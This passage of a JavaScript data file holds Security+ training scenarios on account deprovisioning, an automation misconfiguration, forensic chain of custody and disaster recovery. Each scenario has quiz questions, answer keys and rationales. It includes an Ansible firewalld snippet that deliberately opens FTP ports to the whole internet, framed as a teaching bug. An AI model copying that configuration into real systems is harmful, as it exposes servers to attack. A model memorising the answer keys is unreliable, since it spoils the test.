  - Year 1 + 6 months: Added to VPN-Access (requested for remote work)
  - Year 2: Added to Source-Code-Readers (project assignment)
  - Year 2 + 3 months: Added to Database-Admins (temporary task — NEVER REMOVED)
  - Year 2 + 8 months: Added to Finance-ReadOnly (special project — NEVER REMOVED)
  - Year 3: Added to Developers group (role change)

Termination date: Year 3 + 2 months
  - NO GROUPS REMOVED
  - ACCOUNT NEVER DISABLED

At termination, Sarah had access to:
  - Engineering file shares
  - Production database admin rights
  - Financial reports
  - Source code repositories
  - VPN from any location

This is classic privilege creep: users accumulate permissions for temporary tasks or role changes, but the old permissions are never revoked. Quarterly access reviews would have caught this — they were last performed 18 months ago.

RBAC (Role-Based Access Control) vs. Current State:
  - RBAC assigns permissions based on JOB ROLE
  - When roles change, permissions automatically adjust
  - This organization used ad-hoc group assignments with no lifecycle management
  - Result: accounts became a growing list of permissions with no cleanup`,
        critical: false
      },
      {
        id: 'forgot-04',
        type: 'alert',
        label: 'SIEM Correlation Timeline',
        content: `INCIDENT TIMELINE RECONSTRUCTION:

4 months ago (October 12):
  - HR processes termination for smitchell
  - Offboarding ticket created, assigned to departed manager
  - Ticket sits unassigned in queue (no automation, no escalation)

2 weeks ago:
  - External IP (203.0.113.88) performs reconnaissance: DNS queries for yourcompany.com, VPN endpoint port scans

1 week ago:
  - Failed VPN login attempts for 3 different terminated user accounts (attackers testing old credentials)

48 hours ago:
  - Successful VPN authentication: smitchell account
  - Small data transfer (reconnaissance — testing access)
  - No alert triggered (no anomaly detection on dormant accounts)

This morning (02:47):
  - VPN session: smitchell account from same external IP
  - Mass data exfiltration: 2.3 GB engineering files
  - CASB alert triggered (finally) when files uploaded to Dropbox

The attacker likely obtained Sarah's credentials from a third-party breach (credential stuffing) or from Sarah herself if she went to a competitor. The account should have been disabled on her last day. The 4-month window gave attackers ample time to discover and exploit the active account.`,
        critical: false
      },
      {
        id: 'forgot-05',
        type: 'witness',
        label: 'IT Operations Interview',
        content: `INTERVIEW — IT Director:

"Our deprovisioning process is entirely manual. When HR terminates someone, they're supposed to email IT with the account name and last working day. We then manually disable the AD account and remove group memberships. The problem is that email often gets lost, delayed, or sent to the wrong mailbox."

"We don't have integration between the HR system (Workday) and Active Directory. I've been requesting budget for an IAM automation platform for two years. The business case was rejected because 'we've always done it manually and it works fine.'"

"We're supposed to run quarterly access reviews where managers certify that each team member's permissions are still appropriate. The last review was 18 months ago — managers complained it was too time-consuming and they didn't understand what half the groups meant."

"When Sarah's manager left, his pending approvals should have been reassigned to the new manager, but we didn't have a process for that. His queue just... sat there."

Root cause: No automated IAM lifecycle management. No integration between HR system and identity directory. No accountability for access reviews.`,
        critical: false
      }
    ],

    challenge: {
      question: 'What is the PRIMARY IAM failure that allowed this breach to occur?',
      options: [
        'Lack of multi-factor authentication on VPN connections',
        'Failure to deprovision access when the employee was terminated',
        'Insufficient network segmentation of engineering file shares',
        'Absence of a Security Information and Event Management (SIEM) system'
      ],
      correctIndex: 1,
      rationales: [
        'INCORRECT: MFA would make the attack harder but wouldn\'t prevent it. The real issue is that the account should not have existed at all 4 months after termination. MFA is a compensating control, not a solution to the IAM lifecycle failure.',
        'CORRECT: The account should have been disabled on Sarah\'s last working day. Deprovisioning is the critical final step of the IAM lifecycle. Without automated integration between the HR system and Active Directory, the termination didn\'t trigger account deactivation. This is the root cause — all other failures cascade from this.',
        'INCORRECT: Network segmentation would limit lateral movement but wouldn\'t prevent VPN access. The account had legitimate permissions — segmentation doesn\'t help when the attacker is using valid credentials with authorized access.',
        'INCORRECT: A SIEM helps detect anomalies but doesn\'t prevent the initial access. The fundamental problem is that a terminated employee\'s account remained active. Detection is secondary to prevention in IAM.'
      ]
    },

    debrief: `This breach illustrates CompTIA Objective 4.6: Identity and Access Management. The IAM lifecycle has three phases: provisioning (creating access), maintenance (reviewing access), and deprovisioning (removing access). This organization failed catastrophically at deprovisioning.

Key concepts learned:
  - IAM lifecycle: provision → maintain → deprovision
  - Deprovisioning must be automated (integrate HR system with identity directory)
  - Access reviews (recertification) catch privilege creep and orphaned accounts
  - Privilege creep: users accumulate permissions over time; old access is never removed
  - RBAC (Role-Based Access Control) ties permissions to job roles, simplifying lifecycle management
  - Just-in-time permissions: grant temporary access that automatically expires
  - Orphaned accounts: former employee accounts that remain active are high-risk targets`,

    escalation: `The exfiltrated source code appears on a competitor's product 6 weeks later — they've reverse-engineered your core algorithm. Legal estimates damages at $4.2M in lost competitive advantage. The breach triggers mandatory disclosure under state data breach laws. A forensic audit discovers 37 additional orphaned accounts from former employees dating back 3 years, including 8 with administrative privileges. The board demands immediate implementation of automated IAM lifecycle management and terminates the IT Director for negligence.`,

    refs: [
      { source: 'Study Guide', section: '4.6 - Identity and Access Management', page: 76 },
      { source: 'Study Guide', section: '5.1 - Personnel Security', page: 88 }
    ]
  },

  // ============================================================
  // DOMAIN 4 — Security Operations (Obj 4.7)
  // Teaches: Automation, Scripting, Configuration Management
  // ============================================================
  {
    id: 'MISSION-032',
    title: 'The Automation Catastrophe',
    domain: 'Security Operations',
    objectiveCodes: ['4.7'],
    threatLevel: 'high',
    tags: ['Automation', 'Scripting', 'Configuration Management', 'DevSecOps', 'Infrastructure as Code'],
    briefing: `CRITICAL INCIDENT: At 11:42 this morning, an automated security configuration script executed across your entire server fleet as part of routine weekly hardening. Within 15 minutes, the NOC started receiving alerts: 200 production servers are unreachable. Investigation reveals the automation script accidentally opened firewall ports 20-25 (FTP-DATA range) to 0.0.0.0/0 (the entire internet) instead of closing them. Every production server is now accepting FTP connections from any source IP. The DevOps team is scrambling to understand what went wrong with the automation that was supposed to improve security, not create a catastrophic exposure.`,

    intel: [
      {
        id: 'auto-01',
        type: 'log',
        label: 'Automation Execution Log',
        content: `ANSIBLE PLAYBOOK EXECUTION — SecurityHardening_v3.2.yml

Execution time: 11:42:07 UTC
Target: production_servers group (200 hosts)
Status: SUCCESS (all hosts applied configuration)

Task: Configure firewall rules
  Module: firewalld
  Action: Add rule
  Result: APPLIED to 200 hosts

Changed Configuration:
  BEFORE: Port 20-25 (FTP) - BLOCKED from all sources
  AFTER: Port 20-25 (FTP) - ALLOWED from 0.0.0.0/0 (ANY)

Script excerpt (the bug):
  - name: Configure FTP port blocking
    firewalld:
      port: "20-25/tcp"
      source: "0.0.0.0/0"
      permanent: yes
      state: enabled  # BUG: Should be "disabled" to BLOCK, not "enabled" to ALLOW
      immediate: yes

INTENDED BEHAVIOR: Block FTP ports from all external sources
ACTUAL BEHAVIOR: Opened FTP ports to the entire internet

Root cause: Logic error in the Ansible playbook. The developer intended to disable FTP access but mistakenly used "state: enabled" which creates an ALLOW rule. This is why automation code must be tested in non-production environments before deployment.`,
        critical: true
      },
      {
        id: 'auto-02',
        type: 'forensic',
        label: 'Change Control Analysis',
        content: `CHANGE MANAGEMENT TICKET REVIEW — CHG-2024-1847:

Change Description: "Update security hardening playbook to block legacy protocols (FTP, Telnet)"
Submitter: jchen (DevSecOps Engineer)
Approval: Auto-approved (routine security update)
Testing: "Tested on DEV-WEB-01" (1 server, not representative)
Peer Review: SKIPPED (small change, trusted engineer)
Rollback Plan: "Re-run previous version of playbook"

AUTOMATION BENEFITS (Why organizations use it):
  ✓ Time savings: Configure 200 servers in 5 minutes vs. 2 weeks of manual work
  ✓ Baseline enforcement: Ensures consistent configuration across all systems
  ✓ Standard configurations: Eliminates "drift" where servers diverge from standards
  ✓ Secure scaling: New servers get hardened automatically
  ✓ Employee retention: Reduces tedious manual work
  ✓ Reaction time: Respond to threats by updating hundreds of systems instantly
  ✓ Workforce multiplier: Small teams can manage massive infrastructure

AUTOMATION RISKS (What went wrong here):
  ✗ Complexity: Infrastructure-as-code requires programming skills; logic errors are easy
  ✗ Cost: Time to develop, test, and maintain automation scripts
  ✗ Single point of failure: One bad script affects hundreds of systems simultaneously
  ✗ Technical debt: Scripts must be updated as systems evolve; orphaned scripts become dangerous
  ✗ Ongoing supportability: Requires skilled staff to maintain and troubleshoot

The change was auto-approved because it was categorized as a "routine security improvement" — no one manually reviewed the actual code. A peer review or testing on a representative staging environment would have caught the logic error before production deployment.`,
        critical: true
      },
      {
        id: 'auto-03',
        type: 'alert',
        label: 'Security Monitoring Alerts',
        content: `SIEM ALERT FLOOD — 11:47 UTC onwards:

Alert: New firewall rule allowing public internet access
  Triggered: 200 times (one per server)
  Severity: HIGH
  Rule: ports 20-25/tcp from 0.0.0.0/0

Alert: Unauthorized FTP connection attempts
  12:03 — External IP 45.33.21.88 connected to WEB-PROD-07:21 (FTP)
  12:07 — External IP 198.18.0.44 connected to WEB-PROD-12:21 (FTP)
  12:15 — External IP 203.0.113.99 connected to APP-PROD-03:21 (FTP)
  ... 47 unique external IPs attempted FTP connections

Internet-wide port scanning services (Shodan, Censys) detected the newly opened FTP ports within 21 minutes. Automated scanners began probing for vulnerabilities immediately.

AUTOMATION USE CASE THAT SAVED THE DAY:

The security team responded by:
  1. Immediately running the PREVIOUS version of the hardening playbook (rollback plan)
  2. Exposure window: 33 minutes (automation made rapid remediation possible)
  3. If this had been manual configuration, rollback would have taken hours or days

This demonstrates automation as a double-edged sword:
  - The bug affected 200 servers instantly (amplified impact)
  - The fix also affected 200 servers instantly (rapid recovery)`,
        critical: false
      },
      {
        id: 'auto-04',
        type: 'report',
        label: 'DevSecOps Best Practices Review',
        content: `AUTOMATION GOVERNANCE RECOMMENDATIONS:

1. TESTING STRATEGY:
   - Never test on a single dev server — use a representative staging environment
   - Test against multiple OS versions, configurations, and server roles
   - Automated testing: Run playbooks against ephemeral test VMs, validate with serverspec/InSpec

2. PEER REVIEW (CODE REVIEW):
   - ALL infrastructure code changes must be reviewed by a second engineer
   - Even "small" changes can have catastrophic impact at scale
   - Use version control (Git) with pull request workflows

3. GRADUAL ROLLOUT (CANARY DEPLOYMENT):
   - Apply changes to 5% of servers first
   - Monitor for 30 minutes
   - If no issues, proceed to next 20%, then 100%
   - Catch errors before they affect the entire fleet

4. GUARDRAILS:
   - Automated validation: Before applying firewall rules, check if they open ports to 0.0.0.0/0
   - Policy-as-code: Use tools like OPA (Open Policy Agent) to enforce "no public internet access on production servers"
   - Pre-flight checks: Validate playbook syntax and logic before execution

5. ROLLBACK READINESS:
   - Maintain previous known-good configurations
   - Test rollback procedures regularly
   - Immutable infrastructure: Replace servers instead of modifying them (easier rollback)

6. CONTINUOUS INTEGRATION (CI/CD):
   - Automated testing in CI pipeline before deployment
   - Security scanning of infrastructure code (checkov, tfsec)
   - Approval gates for production changes`,
        critical: false
      },
      {
        id: 'auto-05',
        type: 'witness',
        label: 'DevOps Team Interview',
        content: `INTERVIEW — jchen (DevSecOps Engineer):

"I was adding FTP blocking to the hardening playbook. I tested it on one dev server and it looked correct — the firewall rule was created. What I didn't realize is that the firewalld module syntax is counterintuitive: 'state: enabled' means ENABLE the rule, not enable the BLOCKING behavior."

"I thought I was enabling the blocking rule. In reality, I created a rule that enabled FTP access. If someone had peer-reviewed my code, they would have caught it immediately."

"We used to require peer review for all infrastructure code changes, but six months ago we relaxed the policy for 'trusted engineers' because the review process was slowing down deployments. Management wanted faster iteration. We sacrificed safety for speed."

INTERVIEW — DevOps Manager:

"The business pressure to move fast is intense. We're deploying changes 10 times per day. Mandatory peer reviews felt like bureaucracy. We trusted our senior engineers to make good decisions."

"In hindsight, automation amplifies both good and bad decisions. A manual mistake affects one server. An automation mistake affects 200 servers. We needed the guardrails."`,
        critical: false
      }
    ],

    challenge: {
      question: 'What is the MOST important safeguard that would have prevented this automation failure?',
      options: [
        'Encrypting all automation scripts with AES-256 to prevent tampering',
        'Requiring peer code review and testing in a staging environment before production deployment',
        'Increasing the frequency of security awareness training for developers',
        'Implementing a security information and event management (SIEM) system'
      ],
      correctIndex: 1,
      rationales: [
        'INCORRECT: Encrypting automation scripts protects against unauthorized modification but does nothing to catch logic errors or bugs in the code. The script executed exactly as written — encryption doesn\'t validate correctness.',
        'CORRECT: A peer code review would have caught the logic error before deployment — a second engineer reviewing the playbook would have noticed "state: enabled" creates an ALLOW rule, not a BLOCK rule. Testing in a representative staging environment would have revealed that FTP ports were opened instead of closed. These are the two most critical controls for infrastructure-as-code.',
        'INCORRECT: Security awareness training is important but wouldn\'t prevent a logic error in automation code. The developer wasn\'t careless — they misunderstood the firewalld module syntax. Code review and testing catch these mistakes.',
        'INCORRECT: The SIEM detected the problem after it occurred, but detection is reactive. The goal is PREVENTION through proper development practices (peer review, testing, gradual rollout).'
      ]
    },

    debrief: `This incident covers CompTIA Objective 4.7: Automation and Scripting. Automation is a workforce multiplier that enables small teams to manage massive infrastructure, but it amplifies both successes and failures.

Key concepts learned:
  - Automation benefits: time savings, baseline enforcement, consistent configs, rapid scaling, faster incident response
  - Automation risks: complexity (coding errors), single point of failure (one bug affects many systems), ongoing maintenance burden
  - Guardrails: peer review, automated testing, gradual rollout (canary deployment), policy-as-code validation
  - Infrastructure-as-code must be version controlled, tested, and reviewed like application code
  - Testing on one dev server is insufficient — use representative staging environments
  - Rollback plans are critical when automation affects production systems`,

    escalation: `During the 33-minute exposure window, 47 external attackers probed the open FTP ports. Three servers had legacy FTP services running (unknown to the security team) with default credentials. One attacker successfully authenticated and planted a web shell on APP-PROD-14. The web shell was discovered 48 hours later during routine integrity monitoring. The incident costs $180,000 in emergency response, forensic analysis, and mandatory breach disclosure. The DevOps team immediately reinstates mandatory peer review for all infrastructure code changes, regardless of engineer seniority.`,

    refs: [
      { source: 'Study Guide', section: '4.7 - Automation and Scripting', page: 81 },
      { source: 'Study Guide', section: '4.2 - Change Management', page: 64 }
    ]
  },

  // ============================================================
  // DOMAIN 4 — Security Operations (Obj 4.8)
  // Teaches: Incident Response, Digital Forensics, Chain of Custody
  // ============================================================
  {
    id: 'MISSION-033',
    title: 'The Broken Chain',
    domain: 'Security Operations',
    objectiveCodes: ['4.8'],
    threatLevel: 'critical',
    tags: ['Incident Response', 'Digital Forensics', 'Chain of Custody', 'Evidence Handling', 'NIST 800-61'],
    briefing: `POST-BREACH FORENSIC REVIEW: Three weeks ago, your organization suffered a ransomware attack that encrypted 40 TB of data. The FBI is building a criminal case against the attackers. However, the federal prosecutor just informed your legal team that critical digital evidence collected during the incident may be inadmissible in court due to improper handling. The chain of custody was broken, forensic images weren't properly validated, and key evidence was accessed without documentation. Your CISO has called an emergency review to understand what went wrong with the incident response process and how evidence handling failures jeopardized the criminal investigation.`,

    intel: [
      {
        id: 'chain-01',
        type: 'report',
        label: 'Evidence Handling Failure Report',
        content: `FEDERAL PROSECUTOR FINDINGS — Evidence Admissibility Issues:

EVIDENCE ITEM #1: Compromised Server Hard Drive
  - Drive removed from SERVER-DB-07 by IT technician (not forensics team)
  - Transported in technician's personal vehicle (no secure evidence bag)
  - Stored in IT supply closet for 4 days (no access controls, no log)
  - Multiple people had physical access to closet (janitorial, IT staff, facilities)
  - Chain of Custody: BROKEN — No documentation of who handled it, when, or where it was stored

EVIDENCE ITEM #2: Forensic Disk Image
  - Image created by IT admin using standard "dd" command
  - Hash validation: NOT PERFORMED (no cryptographic verification of integrity)
  - Original drive: Powered on and booted after imaging to "check if ransomware was still there"
  - This write operation modified timestamps and logs, contaminating the evidence

EVIDENCE ITEM #3: Network Packet Capture
  - PCAP file created during the attack (contains C2 communications)
  - File accessed and opened in Wireshark by 3 different analysts
  - No write protection applied — file metadata (access times) modified
  - No hash calculated before analysis

CHAIN OF CUSTODY REQUIREMENTS (NOT FOLLOWED):
  ✗ Document every person who handles evidence
  ✗ Document when evidence was transferred and why
  ✗ Document where evidence was stored and how it was secured
  ✗ Use tamper-evident bags and seals
  ✗ Maintain continuous custody or explain gaps
  ✗ Hash evidence immediately and verify hash before every analysis

Defense attorneys will argue: "You cannot prove this evidence is in the same state as when it was collected. It could have been modified, tampered with, or fabricated."`,
        critical: true
      },
      {
        id: 'chain-02',
        type: 'forensic',
        label: 'NIST 800-61 Compliance Analysis',
        content: `INCIDENT RESPONSE LIFECYCLE REVIEW (NIST SP 800-61):

PHASE 1: PREPARATION — PARTIALLY FOLLOWED
  ✓ Incident response team exists
  ✓ Contact list maintained
  ✗ No documented forensic procedures
  ✗ No evidence handling training
  ✗ No forensic toolkit (write blockers, hash validators, evidence bags)
  ✗ No legal hold procedures
  ✗ No relationship with law enforcement (FBI contact established during incident, not before)

PHASE 2: DETECTION AND ANALYSIS — ADEQUATE
  ✓ Ransomware detected within 2 hours
  ✓ Scope assessment completed
  ✓ IOCs (indicators of compromise) identified
  ✗ Threat hunting not performed (reactive only)

PHASE 3: CONTAINMENT, ERADICATION, RECOVERY — MAJOR FAILURES
  ✗ Contaminated evidence during containment (booted compromised systems)
  ✗ No legal hold issued before starting recovery (emails and logs deleted)
  ✗ Systems rebuilt without forensic imaging
  ✗ Original evidence not preserved

PHASE 4: POST-INCIDENT ACTIVITY — INCOMPLETE
  ✓ Incident documented
  ✗ No root cause analysis performed
  ✗ No lessons learned session conducted
  ✗ No playbook updates

DIGITAL FORENSICS PROCESS (NOT FOLLOWED):

1. Identification: Recognize potential evidence
2. Preservation: Protect evidence from modification
   - Use write blockers on storage devices
   - Legal hold: Prevent automatic deletion of emails, logs, backups
3. Acquisition: Create forensic copies
   - Bit-for-bit disk imaging
   - Calculate cryptographic hash (SHA-256) of original and image
   - Verify hashes match
4. Analysis: Examine evidence (ONLY work on copies, never originals)
5. Reporting: Document findings for legal proceedings`,
        critical: true
      },
      {
        id: 'chain-03',
        type: 'log',
        label: 'Incident Timeline Reconstruction',
        content: `RANSOMWARE INCIDENT TIMELINE:

DAY 1 — Initial Compromise (Missed):
  09:14 — Phishing email delivered to 12 users
  09:47 — User clicks malicious link, downloads payload
  10:22 — Attacker establishes C2 connection (not detected)
  14:00-18:00 — Lateral movement, credential harvesting (no alerts)

DAY 3 — Ransomware Deployment:
  02:30 — Ransomware executable launched on 47 servers simultaneously
  02:45 — EDR alerts flood SOC (detected)
  03:00 — Incident response team activated

DAY 3 — EVIDENCE CONTAMINATION BEGINS:
  03:15 — IT admin reboots SERVER-DB-07 to "see if it still works" (destroyed volatile memory evidence, modified timestamps)
  04:00 — IT tech removes hard drive from SERVER-DB-07 without write blocker
  04:30 — Drive transported to IT office in backpack (chain of custody break)
  08:00 — Forensic consultant arrives, begins imaging drives
  08:45 — Imaging complete, but NO HASH VALIDATION performed
  12:00 — IT admin boots original compromised drive to examine ransomware (CONTAMINATION)

DAY 4-7 — Recovery (Evidence Handling Ignored):
  - Legal hold NOT issued — Exchange server purged deleted items (7-day retention)
  - Firewall logs rotated out (30-day retention, not preserved)
  - Backups overwritten during restore process (no e-discovery hold)

WEEK 3 — Law Enforcement Involvement:
  - FBI requests evidence for criminal prosecution
  - Chain of custody documentation: DOES NOT EXIST
  - Evidence integrity validation: CANNOT BE PROVEN
  - Prosecutor deems evidence inadmissible`,
        critical: false
      },
      {
        id: 'chain-04',
        type: 'alert',
        label: 'Forensic Best Practices Violated',
        content: `CRITICAL VIOLATIONS OF DIGITAL FORENSICS PRINCIPLES:

1. WRITE BLOCKER NOT USED:
   - Storage devices must be connected via write blocker (hardware or software)
   - Prevents ANY modification to original evidence
   - Even mounting a drive read-only can modify metadata without a write blocker

2. HASH VALIDATION NOT PERFORMED:
   - Immediately calculate SHA-256 hash of evidence
   - Recalculate hash before every analysis
   - If hashes don't match, evidence has been altered (chain of custody broken)
   - Hashing proves: "This is EXACTLY the same data we collected on Day 1"

3. WORKING ON ORIGINALS, NOT COPIES:
   - NEVER analyze original evidence
   - Create forensic image (bit-for-bit copy)
   - Analyze the copy; preserve the original in secure storage
   - If analysis destroys data, you still have the pristine original

4. NO LEGAL HOLD:
   - Legal hold = preservation order
   - Prevents automatic deletion of emails, logs, backups during investigation or litigation
   - Must be issued BEFORE starting recovery
   - Failure to issue legal hold = spoliation of evidence (can result in sanctions)

5. CHAIN OF CUSTODY NOT MAINTAINED:
   - Every transfer must be documented: WHO, WHAT, WHEN, WHERE, WHY
   - Use evidence custody forms
   - Store in locked, access-controlled evidence locker
   - Tamper-evident seals on evidence bags
   - Any gap in custody = opportunity for tampering = inadmissibility

6. VOLATILE MEMORY NOT CAPTURED:
   - Rebooting a compromised system destroys RAM contents
   - RAM contains: running processes, encryption keys, network connections, passwords
   - Capture RAM image BEFORE powering off or rebooting`,
        critical: false
      },
      {
        id: 'chain-05',
        type: 'witness',
        label: 'Incident Response Team Interviews',
        content: `INTERVIEW — IT Director:

"When the ransomware hit, our priority was restoring operations as fast as possible. We didn't think about evidence preservation — we thought about getting email and file servers back online. The business was losing $50,000 per hour of downtime."

"We have an incident response plan, but it's focused on technical containment. There's nothing in there about chain of custody, legal holds, or forensic procedures. We've never involved law enforcement before."

"One of my techs pulled the hard drive thinking it would help the forensics team. He didn't know he was supposed to use a write blocker or document the transfer. We just don't have that training."

INTERVIEW — Forensic Consultant (External):

"I arrived 5 hours after the incident started. By then, multiple systems had been rebooted, drives had been handled without write blockers, and logs were already being overwritten. The IT team was well-intentioned but completely untrained in evidence handling."

"When I asked for the chain of custody documentation, they looked at me like I was speaking a foreign language. There was no evidence log, no custody forms, no secure storage. The hard drive was sitting on a desk in an unlocked office."

"From a forensic standpoint, this investigation is compromised. We can still analyze what we have, but I cannot testify in court that this evidence is trustworthy. Too many opportunities for contamination."

INTERVIEW — Legal Counsel:

"If we'd issued a legal hold on Day 1, we would have preserved emails, logs, and backups that are now gone forever. The Exchange server's retention policy deleted crucial evidence. That's on us — IT should have contacted Legal immediately."`,
        critical: false
      }
    ],

    challenge: {
      question: 'What is the MOST critical failure that jeopardized the admissibility of digital evidence in this case?',
      options: [
        'Failure to deploy endpoint detection and response (EDR) on all systems',
        'Lack of multi-factor authentication on administrative accounts',
        'Breaking the chain of custody by not documenting evidence handling and allowing contamination',
        'Insufficient network segmentation between production and backup systems'
      ],
      correctIndex: 2,
      rationales: [
        'INCORRECT: EDR improves threat detection but is unrelated to evidence admissibility. The question is about forensic evidence handling failures, not prevention controls.',
        'INCORRECT: MFA would have made initial compromise harder but doesn\'t affect evidence integrity. The breach already occurred — the issue is whether the collected evidence can be used in court.',
        'CORRECT: Chain of custody documentation proves evidence integrity from collection through analysis. Without it, defense attorneys can argue the evidence was tampered with, modified, or fabricated. The broken chain (undocumented transfers, contaminated drives, no hash validation) makes the evidence inadmissible. This is the root cause of the legal failure.',
        'INCORRECT: Network segmentation is a preventive control, not a forensic procedure. The admissibility issue is about how evidence was collected and preserved, not network architecture.'
      ]
    },

    debrief: `This incident demonstrates CompTIA Objective 4.8: Incident Response and Digital Forensics. Even though the attack was detected and systems were recovered, improper evidence handling destroyed the criminal case against the attackers.

Key concepts learned:
  - NIST SP 800-61 incident response lifecycle: Preparation → Detection/Analysis → Containment/Eradication/Recovery → Post-Incident Activity
  - Digital forensics process: Identification → Preservation → Acquisition → Analysis → Reporting
  - Chain of custody: Documented trail of who handled evidence, when, where, and why
  - Legal hold: Preservation order preventing deletion of potential evidence
  - Write blockers prevent modification of original storage devices
  - Hash validation (SHA-256) proves evidence integrity over time
  - NEVER work on original evidence — analyze forensic copies only
  - Volatile memory (RAM) must be captured before rebooting systems
  - E-discovery: Identifying and preserving electronically stored information for litigation
  - Forensic readiness requires: training, tools (write blockers, imaging software), procedures, law enforcement relationships`,

    escalation: `Without admissible evidence, the FBI cannot prosecute the ransomware operators despite identifying them. The attackers continue operations, targeting other companies. Your organization pays $1.2M in ransom to recover encrypted data because backups were compromised. The board commissions an external review that concludes "systemic failures in incident response planning and forensic readiness." The company hires a forensic readiness consultant, implements comprehensive incident response playbooks, trains all IT staff on evidence handling, and establishes a relationship with FBI cyber division. Legal counsel mandates tabletop exercises quarterly to practice evidence preservation procedures.`,

    refs: [
      { source: 'Study Guide', section: '4.8 - Incident Response', page: 84 },
      { source: 'Study Guide', section: '4.8 - Digital Forensics', page: 86 }
    ]
  },

// ============================================================
  // DOMAIN 5 — Governance, Risk, Compliance (Obj 5.1)
  // Teaches: Security Policies, BCP/DRP, Incident Response, Change Management, Governance Structures
  // ============================================================
  {
    id: 'MISSION-034',
    title: 'When the Storm Came',
    domain: 'Governance, Risk, Compliance',
    objectiveCodes: ['5.1'],
    threatLevel: 'critical',
    tags: ['BCP', 'DRP', 'Governance', 'Change Management', 'Policies'],
    briefing: `DISASTER RECOVERY FAILURE: Hurricane Elena made landfall 6 hours ago, flooding the primary datacenter in your company's ground-floor facility. Emergency power failed, servers are offline, and 400 employees cannot access critical systems. The IT director pulled out the disaster recovery plan — last updated 4 years ago. The "backup site" listed in the plan was decommissioned 18 months ago. No one tested the recovery procedures. The executive team is demanding answers: why wasn't the plan maintained, and how do we get operations running again?`,

    intel: [
      {
        id: 'storm-01',
        type: 'report',
        label: 'Disaster Recovery Plan Audit',
        content: `DOCUMENT REVIEW — DRP_2022_Final.pdf (Last Modified: March 2022)

Recovery Site Information:
  Primary: 123 Harbor Blvd (current location — FLOODED)
  Secondary: DataVault Co-Lo Facility, 500 Industrial Pkwy
    — Contact: James Morrison, (555) 0184
    — Contract Status: EXPIRED (terminated Oct 2024)
    — Current Status: Facility was sold and decommissioned

The DRP is a type of security policy that defines procedures for recovering IT operations after a disaster. It should specify:
  - Recovery site locations and contact information
  - Data backup procedures and restoration steps  
  - Communication plans and escalation chains
  - Recovery Time Objectives (RTO) for each critical system

Business Continuity Planning (BCP) is the broader framework — it covers the entire business (operations, HR, finance). Disaster Recovery (DR) is the IT-focused subset of BCP.

Critical finding: The DRP references infrastructure that no longer exists. No annual review process was documented or followed.`,
        critical: true
      },
      {
        id: 'storm-02',
        type: 'log',
        label: 'Change Management System Logs',
        content: `CHANGE TICKET #CH-2024-1847 (October 12, 2024):

Title: "Terminate DataVault Co-Location Contract"
Requestor: Finance Department
Reason: "Cost reduction initiative — migrating backup storage to AWS"
Status: APPROVED and COMPLETED

Change Advisory Board (CAB) Meeting Notes:
  - Finance presented cost savings: $48K/year
  - IT Operations approved the AWS migration
  - Security was not invited to the CAB meeting
  - No one flagged that DataVault was listed in the DRP as the recovery site

Change Management Policy requires impact assessment for infrastructure changes. The policy states: "Any change affecting disaster recovery capabilities must trigger a DRP update and revalidation." This step was skipped.

The change control process failed. The change was approved in isolation without considering dependencies on disaster recovery procedures. This is why governance structures matter — the CAB should include representatives from security, compliance, and risk management, not just IT operations and finance.`,
        critical: true
      },
      {
        id: 'storm-03',
        type: 'forensic',
        label: 'Backup Verification Results',
        content: `BACKUP SYSTEM ANALYSIS:

AWS S3 Backup Bucket Status:
  - 847 GB of data successfully replicated
  - Last backup: 6 hours ago (completed before power loss)
  - Retention: 90 days of versioned backups
  - Encryption: AES-256 at rest

Good news: The data survived. The migration to AWS actually worked.

Bad news: No one documented HOW to restore from AWS or WHERE to restore TO. The DRP still references the old tape restoration procedure from the decommissioned co-location facility. There's no playbook for:
  - Spinning up recovery infrastructure in AWS
  - Restoring database files to temporary instances
  - Redirecting user traffic to recovery systems

A playbook is a documented, step-by-step procedure for handling a specific scenario. Modern Security Orchestration, Automation, and Response (SOAR) systems use automated playbooks. This company had neither — no manual playbook, no automation.`,
        critical: false
      },
      {
        id: 'storm-04',
        type: 'witness',
        label: 'IT Director Interview',
        content: `"I've been asking to schedule a disaster recovery test for 3 years. Every time I bring it up, management says we're too busy to take systems offline for a drill. The last DR test was in 2021 — we successfully failed over to the DataVault site. That facility is gone now.

When Finance wanted to cut the DataVault contract, I wasn't in that meeting. I found out about it in an email after it was already approved. No one connected the dots between our cost-cutting and our disaster recovery capability.

We have an Information Security Policy that requires annual review of all security and recovery plans. It's in the employee handbook. But there's no enforcement mechanism, no audit committee checking compliance. Policies don't matter if nobody follows them and there's no governance structure to enforce them."`,
        critical: false
      },
      {
        id: 'storm-05',
        type: 'alert',
        label: 'Incident Response Status',
        content: `INCIDENT TIMELINE (Hurricane Elena — IT Impact):

06:00 — Hurricane makes landfall
08:15 — Primary power lost, generators activate
08:47 — Flood water reaches generator room, backup power fails
08:50 — All on-premises systems offline
09:00 — IT director declares disaster, initiates DRP procedures
09:15 — Discovery: Recovery site no longer exists
09:30 — Security team not notified (no incident response role definitions)
10:00 — Executives demand status update, no clear communication plan
11:45 — AWS team begins ad-hoc recovery (no documented procedure)

The company has an Incident Response Policy that defines roles: Incident Commander, Communications Lead, Technical Lead. But these roles were never assigned to specific people or departments. During the crisis, no one knew who was in charge.

Security procedures for onboarding should include DR role assignment. Offboarding procedures should trigger reviews of access to recovery systems. Neither happened here.`,
        critical: false
      }
    ],

    challenge: {
      question: 'What governance failure MOST directly caused the disaster recovery breakdown?',
      options: [
        'Insufficient encryption on the AWS backup storage',
        'Lack of automated SOAR playbooks for recovery procedures',
        'Change management process excluded security and did not trigger DRP updates',
        'Password policy did not enforce MFA on critical systems'
      ],
      correctIndex: 2,
      rationales: [
        'INCORRECT: Encryption protects data at rest, but the backups were encrypted and intact. The problem was not data loss — it was the inability to execute a recovery due to outdated procedures.',
        'INCORRECT: While SOAR playbooks would help, they are not required for basic disaster recovery. The fundamental problem was that a major infrastructure change (decommissioning the recovery site) was not reflected in the DRP. Manual procedures would have sufficed if they existed.',
        'CORRECT: The Change Advisory Board approved decommissioning the recovery site without assessing the impact on disaster recovery plans. Change management policy requires impact assessment, but security was excluded from the meeting. This governance gap — lack of cross-functional oversight in change control — directly caused the DRP to become outdated and useless.',
        'INCORRECT: MFA improves authentication security but is irrelevant to disaster recovery planning and change management failures.'
      ]
    },

    debrief: `This investigation covers CompTIA Objective 5.1: Security Governance. Policies and plans are worthless without governance structures to maintain them.

Key concepts learned:
  - BCP (Business Continuity Planning): Organization-wide resilience framework
  - DRP (Disaster Recovery Plan): IT-focused subset covering system recovery
  - Change Management Policy: Requires impact assessment before infrastructure changes
  - Governance structures: Boards and committees (CAB, audit committee) provide oversight
